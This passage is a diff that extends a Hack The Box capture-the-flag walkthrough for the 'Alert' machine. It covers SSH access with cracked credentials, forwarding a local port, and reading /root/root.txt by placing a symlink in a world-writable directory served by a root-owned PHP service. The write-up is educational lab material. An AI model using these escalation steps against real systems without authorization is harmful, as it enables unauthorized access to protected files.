@@ -2,6 +2,8 @@
 
 ## Description
 
+Alert is a linux machine on [Hack The Box](https://app.hackthebox.com/machines/Alert). The machine is rated as easy and is a great way to learn about XSS, path traversal, and symlink attacks.
+
 ## Walkthrough
 
 ### Enumeration
@@ -286,3 +288,140 @@ Let's try to crack the password using `hashcat`.
 We have the password!
 
 ![exfil](resources/loggedin.JPG)
+
+### SSH
+
+Let's try to connect to the machine using the credentials we found.
+
+```bash
+┌──(cherif㉿kali)-[~/Desktop/HTB/machines/Alert]
+└─$ ssh albert@10.10.11.44
+```
+
+We are in! And we have the user flag.
+
+### Root flag
+
+Let's check the sudo permissions.
+
+```bash
+albert@alert:~$ sudo -l
+[sudo] password for albert: 
+Sorry, user albert may not run sudo on alert.
+```
+
+We unfotunately don't have sudo permissions. After some annoying research, I tryed to check lolcal ports.
+
+```bash
+albert@alert:~$ ss -lntp
+State                       Recv-Q                      Send-Q                                           Local Address:Port                                             Peer Address:Port                 
+LISTEN                      0                           4096                                             127.0.0.53%lo:53                                                    0.0.0.0:*                                                      
+LISTEN                      0                           128                                                    0.0.0.0:22                                                    0.0.0.0:*                                                      
+LISTEN                      0                           4096                                                 127.0.0.1:8080                                                  0.0.0.0:*                                                      
+LISTEN                      0                           128                                                       [::]:22                                                       [::]:*                                                      
+LISTEN                      0                           511                                                          *:80                                                          *:*
+```
+
+Port 8080 is open on the local machine. Let's try to list all running processes on it.
+
+```bash
+albert@alert:~$ ps aux | grep 8080
+root        1012  0.0  0.6 207256 26440 ?        Ss   02:16   0:01 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
+albert    113387  0.0  0.0   6432   656 pts/0    S+   16:10   0:00 grep --color=auto 8080
+```
+
+Something intresting is running as root. Let's try to access it.
+
+#### Port forwarding
+
+To access the service running on port 8080, we can use port forwarding.
+
+```bash
+┌──(cherif㉿kali)-[~/Desktop/HTB/machines/Alert]
+└─$ ssh -L 8080:127.0.0.1:8080 albert@10.10.11.44
+```
+
+- -L: Specifies the port forwarding.
+- 8080: The port on the local machine.
+
+Now, we can access the service running on port 8080 on the remote machine.
+
+![website monitor](resources/monitor.JPG)
+
+The website monitor allows us to monitor websites.
+
+#### Exploration
+
+Knowing that the service is running as root, we can try to exploit it.
+Let's check the opt/website-monitor directory.
+
+```bash
+albert@alert:/opt/website-monitor/monitors$ ls -la /opt/website-monitor
+total 96
+drwxrwxr-x 7 root root        4096 Oct 12 01:07 .
+drwxr-xr-x 4 root root        4096 Oct 12 00:58 ..
+drwxrwxr-x 2 root management  4096 Feb  8 13:38 config
+drwxrwxr-x 8 root root        4096 Oct 12 00:58 .git
+drwxrwxr-x 2 root root        4096 Oct 12 00:58 incidents
+-rwxrwxr-x 1 root root        5323 Oct 12 01:00 index.php
+-rwxrwxr-x 1 root root        1068 Oct 12 00:58 LICENSE
+-rwxrwxr-x 1 root root        1452 Oct 12 01:00 monitor.php
+drwxrwxrwx 2 root root        4096 Oct 12 01:07 monitors
+-rwxrwxr-x 1 root root         104 Oct 12 01:07 monitors.json
+-rwxrwxr-x 1 root root       40849 Oct 12 00:58 Parsedown.php
+-rwxrwxr-x 1 root root        1657 Oct 12 00:58 README.md
+-rwxrwxr-x 1 root root        1918 Oct 12 00:58 style.css
+drwxrwxr-x 2 root root        4096 Oct 12 00:58 updates
+```
+
+```bash
+albert@alert:/opt/website-monitor$ cd monitors
+albert@alert:/opt/website-monitor/monitors$ ls -la
+total 24
+drwxrwxrwx 2 root root 4096 Oct 12 01:07 .
+drwxrwxr-x 7 root root 4096 Oct 12 01:07 ..
+-rw-r--r-x 1 root root 5574 Feb  8 16:22 alert.htb
+-rw-r--r-x 1 root root 5572 Feb  8 16:22 statistics.alert.htb
+```
+
+Using the web app, we can read the content of the files in the monitors directory.
+Remember that the service is running as root, so we can use this to read the root flag.
+
+The first idea that comes to mind is to create a reverse shell and upload it to the server, but we there is a simpler way to do this.
+We will create a symlink in the monitors directories of the root/root.txt file: symlink is a file that contains a reference to another file or directory in the form of an absolute or relative path (a sort of pointer).
+
+```bash
+albert@alert:/opt/website-monitor/monitors$ ln -s /root/root.txt root.txt
+```
+
+- `ln` is used to create a link.
+- `-s` is used to create a symbolic link.
+- `/root/root.txt` is the file we want to link to.
+- `root.txt` is the name of the link.
+
+Now, we can read the content of the root.txt file using the web app.
+
+```bash
+┌──(cherif㉿kali)-[~]
+└─$ curl http://127.0.0.1:8080/monitors/root.txt
+```
+
+And we have the root flag!
+
+## Conclusion
+
+This was a fun machine. It combined a lot of different techniques, such as XSS, path traversal, and symlink attacks. More than that, it was a good reminder that sometimes the simplest solution is the best one, and that we always have many ways to achieve our goals.
+Hope you enjoyed the writeup. Stay safe and happy hacking! 🚀🚀🚀
+
+## Useful resources
+
+- [CyberChef](https://gchq.github.io/CyberChef/)
+- [hashcat](https://hashcat.net/hashcat/)
+- [apache.porg](https://httpd.apache.org/docs/2.4/programs/htpasswd.html)
+- [digitalocean.com](https://www.digitalocean.com/community/tutorials/how-to-set-up-password-authentication-with-apache-on-ubuntu-20-04)
+- [Symlink](https://en.wikipedia.org/wiki/Symbolic_link)
+
+## Contact
+
+This Walkthrough was created by Cherif Jebali. You can sens me an email at [cherifjebali0301@gmail.com](mailto:cherifjebali0301@gmail.com).
+
